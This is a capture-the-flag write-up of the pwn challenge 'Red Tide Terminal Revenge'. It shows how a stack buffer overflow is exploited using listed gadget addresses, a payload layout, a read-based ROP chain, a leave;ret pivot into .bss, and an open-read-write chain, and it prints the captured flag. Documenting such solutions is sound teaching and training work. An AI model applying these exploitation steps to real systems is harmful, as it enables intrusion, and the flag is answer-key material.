# Junior Crypt 2026 CTF — `Red Tide Terminal Revenge` Writeup

- **Author:** Efe Sahinbas
- **GitHub Repository:** [MacallanTheRoot/ctf-writeups](https://github.com/MacallanTheRoot/ctf-writeups/)

**Category:** Pwn  
**Target:** `red_tide_terminal_revenge`  
**Remote:** `10.112.0.12:42792`  
**Flag format:** `grodno{...}`

---

## Challenge Description

```text
The abandoned coastal command terminal continues to transmit a signal...

Reach the terminal core and recover the flag.
```

---

## Summary

This was a harder variant of `Red Tide Terminal`. The service banner changed to:

```text
== Red Tide Terminal Revenge ==
Channel restored.
```

The new binary added an `Audit note` step and reduced the packet limit to `0xb0`. The vulnerable route still allowed control of the return address, but the usable first-stage ROP chain had to be smaller.

The final solution used a compact read-and-pivot stage:

1. Overflow the route packet buffer.
2. Set the saved `rbp` to `stage_area`.
3. Use a short syscall-based `read(0, stage_area, 0x600)` chain.
4. Return to `leave; ret` and pivot into `stage_area`.
5. Execute a full ORW chain from `.bss`.

Final flag:

```text
grodno{c59a01db-4418-4e87-b718-87687056a019}
```

---

## 1. Initial Binary Triage

The local file was:

```text
red_tide_terminal_revenge
```

The binary was a 64-bit Linux ELF with common mitigations:

```text
Full RELRO
Stack Canary
NX enabled
PIE enabled locally
```

The remote process again behaved like a fixed-address build. The useful remote addresses were:

```text
pop rdi; ret  0x4013ec
pop rsi; ret  0x4013f5
pop rdx; ret  0x4013fe
pop rax; ret  0x401407
syscall; ret  0x401410
leave; ret    0x4013e6
stage_area    0x404060
```

---

## 2. New Program Flow

The service asked for two text inputs before entering the packet route:

```text
Codename:
Audit note:
Packet length:
Packet data:
```

The `Audit note` field still gave useful stack-format behavior, but the exploitation path did not need to rely on it directly. The packet handler was still the most useful primitive.

---

## 3. Route Packet Layout

Disassembly of `route_packet` showed:

```asm
sub rsp, 0x60
...
lea rax, [rbp-0x50]
read(0, rax, length)
```

The important offsets were:

```text
buffer        rbp - 0x50
saved rbp     offset 0x50
saved rip     offset 0x58
length limit  0xb0
```

The old exploit did not work directly because the first-stage ROP chain had to fit within the smaller `0xb0` limit.

---

## 4. Gadget Verification

Two possible gadget sets appeared during analysis. A direct `write(1, addr, len)` test showed that the shifted set was the one that worked remotely:

```text
pop rdi; ret  0x4013ec
pop rsi; ret  0x4013f5
pop rdx; ret  0x4013fe
pop rax; ret  0x401407
syscall; ret  0x401410
```

The pivot gadget was verified with a small second-stage payload that wrote `TEST`:

```text
leave; ret = 0x4013e6
```

The successful test output was:

```text
Packet queued.
TEST
```

---

## 5. Compact Stage 1

The final first stage used the saved `rbp` slot directly instead of spending ROP space on `pop rbp; ret`.

Payload layout:

```text
"A" * 0x50
p64(stage_area)      # saved rbp
short ROP chain
```

The short chain was:

```text
rax = 0
rdi = 0
rsi = stage_area
rdx = 0x600
syscall              # read(0, stage_area, 0x600)
leave; ret
```

Because `rbp` had already been overwritten with `stage_area`, `leave; ret` pivoted execution into the second-stage ROP chain.

---

## 6. Stage 2: ORW

The second stage was stored at `stage_area` and executed from `.bss`.

It performed:

```text
openat(AT_FDCWD, "flag.txt", 0)
read(3, io_area, 0x100)
write(1, io_area, 0x100)
exit(0)
```

The string `flag.txt` was placed later inside the same `.bss` payload.

---

## 7. Getting the Flag

After the pivot was fixed and the second-stage ORW chain was sent, the remote service printed:

```text
grodno{c59a01db-4418-4e87-b718-87687056a019}
```

---

## 8. Conclusion

The Revenge variant kept the same general idea but forced a smaller first stage. The key changes were:

```text
1. Account for the new Codename -> Audit note -> Packet length flow.
2. Use the correct remote gadget set.
3. Respect the 0xb0 packet limit.
4. Overwrite saved rbp with stage_area.
5. Use leave; ret as the pivot.
6. Run the full ORW chain from .bss.
```
